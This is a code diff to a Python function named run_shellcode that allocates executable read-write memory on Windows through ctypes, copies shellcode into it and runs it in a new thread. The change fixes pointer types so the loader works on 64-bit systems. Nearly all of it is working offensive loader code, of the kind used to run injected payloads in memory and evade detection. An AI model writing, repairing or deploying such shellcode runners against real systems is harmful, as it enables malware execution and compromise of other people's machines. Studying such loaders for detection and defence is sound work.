@@ -762,6 +762,7 @@ def run_shellcode(shellcode):
         #   __in      DWORD flAllocationType,   // The type of memory allocation, flags 0x1000 (MEMCOMMIT) and 0x2000 (MEMRESERVE) to both reserve and commit memory
         #   __in      DWORD flProtect           // Enables RWX to the committed region of pages
         # );
+        ptr = ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
         ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                 ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
         # BOOL WINAPI VirtualLock(
@@ -774,7 +775,7 @@ def run_shellcode(shellcode):
         #   _In_  const VOID UNALIGNED *Source,         // A pointer to the source memory block to copy the bytes from.
         #   _In_        SIZE_T         Length           // The number of bytes to copy from the source to the destination.
         # );
-        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
+        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(ptr),
                 buf, ctypes.c_int(len(shellcode)))
         # HANDLE WINAPI CreateThread(
         #   _In_opt_  LPSECURITY_ATTRIBUTES  lpThreadAttributes,    // If lpThreadAttributes is NULL, the thread gets a default security descriptor.
@@ -785,7 +786,7 @@ def run_shellcode(shellcode):
         #   _Out_opt_ LPDWORD                lpThreadId             // NULL, so the thread identifier is not returned.
         # );
         ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
-                ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
+                ctypes.c_int(0), ctypes.c_void_p(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
         # Waits until the specified object is in the signaled state or the time-out interval elapses
         ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 
